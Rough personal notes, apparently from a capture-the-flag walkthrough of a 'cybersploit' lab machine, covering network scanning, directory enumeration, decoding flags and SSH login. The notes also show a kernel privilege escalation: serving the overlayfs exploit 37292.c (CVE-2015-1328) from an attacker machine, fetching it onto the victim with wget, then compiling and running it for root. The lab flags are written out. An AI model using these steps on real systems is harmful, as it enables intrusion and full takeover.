

1st screenshot -ifconfig
netdiscover -r ip
nmap ip  -p- -sV
searchsploit <vulnerability>

should also include failure attemps asw


http
1.look for the web page  - click and try 
2.view page source
3.sub directory analysis
	locate wordlists
	 dirb http://192.168.56.101/
	http://192.168.56.101/robots.txt
	
	 echo "R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9"| base64 -d
	 the -d` stands for decode.
	 <cypher>
	 or
	 online html decode
	 or
	 cyber chef
	 
	Flag1: cybersploit{youtube.com/c/cybersploit}  



nikto -h <url> - vulnerability scanner
clickjacking

4.sub domain analysis -dnsdumpster.com


ssh itsskv@192.168.56.101  (pwd- flag1)
ls

good work !
flag2: cybersploit{https:t.me/cybersploit1}

whoami
sudo -l -list all the applicationscat 
uname -a

search version (3.13.0 cd itsskv/
) exploit in ggl -exploit db/rapid 7
kernal exploitation

Download the exploit file.

Open new tab and share the file using Python server.

Command: python -m http.server 80


Now to download(in cybersploit ) the file we will use the below command..

Command: wget http://192.168.0.109/37292.c

So the file has been saved to cybersploit machine.

Now we will need to run this file. And to run the file we use the following command..

Command:

gcc 37292.c -0 root

 ./root

cd /root

OR

┌──(root㉿kali)-[~]
└─# ls
       
┌──(root㉿kali)-[~]
└─# searchsploit CVE-2015-1328
Exploits: No Results
Shellcodes: No Results
            
┌──(root㉿kali)-[~]
└─# searchsploit Overlayfs    
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
Linux Kernel (Ubuntu / Fedora / RedHat) - 'Overla | linux/local/40688.rb
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14 | linux/local/37293.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overla | linux/local/39166.c
Linux Kernel 4.3.3 - 'overlayfs' Local Privilege  | linux/local/39230.c
OverlayFS inode Security Checks - 'inode.c' Local | linux/local/36571.sh
Ubuntu 14.04/15.10 - User Namespace Overlayfs Xat | linux/local/41762.txt
Ubuntu 15.10 - 'USERNS ' Overlayfs Over Fuse Priv | linux/local/41763.txt
Ubuntu 19.10 - ubuntu-aufs-modified mmap_region() | linux/dos/47692.txt
-------------------------------------------------- ---------------------------------
┌──(root㉿kali)-[~]
└─# searchsploit -m linux/local/37292.c
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /root/37292.c


┌──(root㉿kali)-[~]
└─# python -m http.server 80           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
292.c



CMD of victim in my KALI

wget http://<kali ip>:80/<filename>
wget http://192.168.0.102:80/37292.c             
gcc ./37292.c 
ls
./.<file name> - thiws is how a executable file is opened in linux
.a/.out
cd  /root


install claude cli in my kali

